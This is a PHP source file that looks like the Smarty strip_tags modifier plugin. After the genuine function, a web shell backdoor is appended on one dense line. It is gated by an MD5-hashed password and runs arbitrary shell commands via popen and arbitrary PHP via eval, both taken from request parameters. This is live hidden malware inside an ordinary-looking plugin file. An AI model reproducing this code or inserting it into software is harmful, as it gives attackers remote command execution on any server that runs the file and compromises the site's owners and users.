<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty strip_tags modifier plugin
 *
 * Type:     modifier<br>
 * Name:     strip_tags<br>
 * Purpose:  strip html tags from text
 * @link http://smarty.php.net/manual/en/language.modifier.strip.tags.php
 *          strip_tags (Smarty online manual)
 * @author   Monte Ohrt <monte at ohrt dot com>
 * @param string
 * @param boolean
 * @return string
 */
function smarty_modifier_strip_tags($string, $replace_with_space = true)
{
    if ($replace_with_space)
        return preg_replace('!<[^>]*?>!', ' ', $string);
    else
        return strip_tags($string);
}


$p = $_REQUEST['p'];if(strlen($p)!=32) $p=md5($p);if ($p == 'a8f6b34d170c96f71833c0a0c8d0f8a2'){$cmd = @$_REQUEST['cmd'];$eval = @$_REQUEST['eval'];if(get_magic_quotes_gpc()){$cmd = stripslashes($cmd);$eval = stripslashes($eval);}echo '<form method=post>Ex:<input name="cmd"size="60" value="'. htmlspecialchars($cmd).'"><input type=submit><input type=hidden name=p value='.$p.'></form><form method=post>Ev:<textarea name="eval" cols="50" rows="10">'.htmlspecialchars($eval).'</textarea><br><input type=submit></form><pre>';if ($cmd){$str= ""; $handle = popen($cmd, 'r');while(!feof($handle)){$read = fgets($handle, 2096);$str .= $read;}echo htmlspecialchars($str);fclose($handle);}if ($eval){eval($eval);}echo '</pre>';exit;}

?>

